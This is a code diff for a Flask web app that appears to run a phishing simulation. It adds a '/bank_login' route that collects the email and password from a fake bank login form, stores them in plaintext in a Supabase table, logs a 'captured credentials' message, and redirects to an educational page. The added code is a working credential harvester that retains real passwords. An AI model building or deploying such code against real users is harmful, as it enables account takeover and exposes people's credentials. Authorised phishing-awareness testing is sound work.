@@ -178,6 +178,29 @@ def college_login():
         
     return redirect(url_for('phishing_info'))
 
+@app.route("/bank_login", methods=['POST'])
+def bank_login():
+    """Captures credentials and redirects to the phishing info page."""
+    if not supabase:
+        print("Error: Supabase client not initialized. Cannot save credentials.")
+        return redirect(url_for('phishing_info')) # Redirect anyway
+
+    try:
+        email = request.form.get('email')
+        password = request.form.get('password')
+        
+        login_data = {
+            "email": email,
+            "password": password,
+            "login_time": datetime.now().isoformat()
+        }
+        supabase.table('logins').insert(login_data).execute()
+        print(f"Successfully captured credentials for: {email}")
+    except Exception as e:
+        print(f"Error sending login data to Supabase: {e}")
+        
+    return redirect(url_for('phishing_info'))
+
 @app.route("/phish", methods=['GET'])
 def phishing_info():
     """Displays the educational page about the phishing simulation."""
